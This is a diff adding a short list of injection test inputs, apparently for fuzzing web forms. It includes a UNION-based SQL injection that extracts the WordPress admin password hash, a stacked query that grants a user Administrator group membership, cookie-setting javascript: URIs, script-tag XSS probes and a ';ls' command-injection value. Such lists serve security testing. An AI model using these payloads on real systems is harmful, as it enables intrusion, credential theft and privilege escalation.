@@ -1,0 +1,11 @@
+84058
+84059-2222
+user=1’
+user=-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+user_pass+FROM+wp_users+WHERE+ID=1)
+SELECT user_id, username, password_hash FROM users WHERE username = 'john'; INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'
+javascript:alert("Hello"); alert("World");
+javascript:void(document.cookie="Message=INJECTED");alert(document.cookie);
+<!DOCTYPE html><html><body>This is a basic web page.<script>alert("Look! I made the browser do something.")</script></body></html>
+<script> alert("Look! I made the browser do something."); </script>
+;ls
+./runMyScript.sh
